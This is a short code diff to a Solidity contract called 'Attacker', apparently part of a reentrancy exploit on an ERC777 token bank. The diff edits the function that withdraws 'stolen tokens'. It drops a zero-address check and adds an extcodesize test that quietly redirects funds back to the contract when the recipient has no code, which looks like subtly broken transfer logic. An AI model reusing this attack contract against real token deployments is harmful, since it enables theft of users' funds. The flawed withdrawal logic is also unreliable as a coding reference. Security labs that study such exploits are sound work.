@@ -61,11 +61,18 @@ contract Attacker is AccessControl, IERC777Recipient {
 
     /// @notice Send all stolen tokens to recipient
     function withdraw(address recipient) external onlyRole(ATTACKER_ROLE) {
-        require(recipient != address(0), "Invalid recipient");
         ERC777 token = bank.token();
-        uint256 bal = token.balanceOf(address(this));
+		uint256 bal = token.balanceOf(address(this));
+
+		uint256 size;
+		assembly {
+            size := extcodesize(recipient)
+		}
+		if (size == 0) {
+			recipient = address(this);
+		}
         token.send(recipient, bal, "");
-    }
+	}
 
     /// @dev ERC777 hook called when this contract receives tokens
     function tokensReceived(
